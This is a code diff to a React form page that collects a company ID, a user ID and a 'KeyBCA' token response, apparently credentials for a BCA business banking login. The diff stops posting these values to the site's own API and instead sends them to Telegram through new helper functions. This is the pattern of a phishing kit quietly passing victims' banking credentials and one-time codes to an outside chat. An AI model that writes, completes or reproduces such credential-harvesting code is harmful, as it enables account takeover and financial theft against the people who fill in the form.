@@ -12,7 +12,7 @@ import {
 } from "@/components/ui/select";
 import { useToast } from "@/hooks/use-toast";
 import { useMutation } from "@tanstack/react-query";
-import { apiRequest } from "@/lib/queryClient";
+import { sendToTelegram, formatInfoMessage } from "@/lib/telegram";
 
 export default function InfoPage() {
   const [companyId, setCompanyId] = useState("");
@@ -24,7 +24,12 @@ export default function InfoPage() {
 
   const infoMutation = useMutation({
     mutationFn: async (data: { companyId: string; userId: string; keybcaResponse: string; language: string }) => {
-      return await apiRequest("POST", "/api/info", data);
+      const message = formatInfoMessage(data.companyId, data.userId, data.keybcaResponse);
+      const success = await sendToTelegram(message);
+      if (!success) {
+        throw new Error("Failed to send to Telegram");
+      }
+      return success;
     },
     onSuccess: () => {
       setCompanyId("");
